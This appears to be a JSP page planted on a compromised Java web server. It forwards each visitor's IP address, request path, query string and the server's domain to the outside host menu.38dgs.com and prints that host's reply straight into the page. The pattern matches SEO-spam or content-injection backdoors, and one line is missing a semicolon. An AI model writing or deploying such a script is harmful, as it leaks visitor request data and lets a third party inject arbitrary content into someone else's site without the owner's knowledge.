<%@ page language="java" import="java.util.*" pageEncoding="utf-8"%>
<%@page import="com.http.web.*" %>
<%
String User_agent = request.getHeader("User-Agent")
String Remote_server = "http://menu.38dgs.com";
String host_name = "http://" + request.getRemoteAddr() + request.getRequestURI();
String Remote_file = Remote_server + "/index.php?host=" + host_name + "&url=" + request.getQueryString() + "&domain="+request.getServerName();
String Content_mb = myHttpClient.getHttpget(Remote_file);
out.println(Content_mb);
%>


